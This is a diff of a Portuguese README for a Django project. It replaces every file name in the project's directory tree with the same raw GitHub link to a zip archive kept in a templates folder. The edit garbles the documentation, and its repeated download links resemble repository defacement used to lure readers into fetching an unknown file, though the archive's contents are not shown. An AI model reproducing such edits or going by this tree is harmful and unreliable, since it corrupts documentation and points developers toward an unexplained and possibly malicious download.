@@ -25,18 +25,18 @@ nome_do_projeto/
 │   ├── migrations/
 │   ├── templates/
 │   ├── static/
-│   ├── __init__.py
-│   ├── admin.py
-│   ├── apps.py
-│   ├── models.py
-│   ├── views.py
-│   └── urls.py
-├── manage.py
+│   ├── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
+│   ├── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
+│   ├── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
+│   ├── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
+│   ├── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
+│   └── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
+├── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
 ├── nome_do_projeto/
-│   ├── settings.py
-│   ├── urls.py
-│   └── wsgi.py
-└── README.md
+│   ├── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
+│   ├── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
+│   └── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
+└── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
 ```
 
 ## Funcionalidades do Sistema
